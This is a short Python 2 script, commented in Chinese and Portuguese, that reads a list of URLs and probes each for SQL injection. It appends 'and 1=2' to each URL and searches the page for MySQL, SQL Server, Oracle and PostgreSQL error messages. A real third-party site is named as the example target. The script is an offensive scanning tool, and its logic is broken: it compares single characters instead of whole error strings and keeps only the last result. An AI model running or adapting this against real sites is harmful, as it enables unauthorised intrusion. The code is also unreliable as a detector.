# !/usr/bin/python
# -*-coding=utf-8-*-
# Example site:@http://www.apostilando.com/pagina.php?cod=1
# 将要扫描的网站写入当前目录文件中。python xxx.py  xxx.txt

import urllib
import os
import sys

if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")


def usage():
    print
    """
    =================SQL INJECTION=====================
    Usage:python %s %s
    """ % (sys.argv[0], sys.argv[1])


def scanner(url):
    try:
        page = urllib.urlopen(url).read()
    except:
        print
        "[-]Error!!!\n"
        return (0)
    #   如果一个网站存在SQL注入的话就，当你使用基本的尝试方法去测试时页面会出现如下报错。
    sqls = ("mysql_result(): supplied argument is not a valid MySQL result resource in",
            "[Microsoft][ODBC SQL Server Driver][SQL Server]",
            "Warning:ociexecute",
            "Warning: pq_query[function.pg-query]:")
    i = 0
    page = str(page.lower())
    while i < len(sqls):
        sql = str(sqls[i]).lower()
        if page.find(sql[i]) == -1:
            check = 0
        else:
            check = 1
        i += 1
    if check == 0:
        print
        "[-]" + url + " <No Vulneravel>"
    else:
        print
        "[+]" + url + " <Vulneravel>"


def main(args):
    if len(args) != 1:
        usage()
        print
        "\t[-]Mode to use: %s <File>\n" % sys.argv[0]
        print
        "\t[-]Example: %s Site.txt\n" % sys.argv[0]
        #        print sys.argv[0],sys.argv[1],len(args)
        sys.exit(0)
    usage()
    try:
        f = open(str(sys.argv[1]), "r")
        urls = f.readlines()
    #        print urls
    except:
        print
        "[+]Error to open the file " + sys.argv[1] + ""
        return (-1)
    f.close()
    i = 0
    while i < len(urls):
        if urls[i].find("http://") == -1:
            urls[i] = "http://" + urls[i]
        urls[i] = urls[i].replace("\n", "")
        #        利用基本放法进行测试，如：and 1=1，and 1=2，’，查看是否出现sqls中的错误信息
        a = scanner(urls[i] + "and 1=2")
        i += 1


if __name__ == "__main__":
    main(sys.argv[1:])
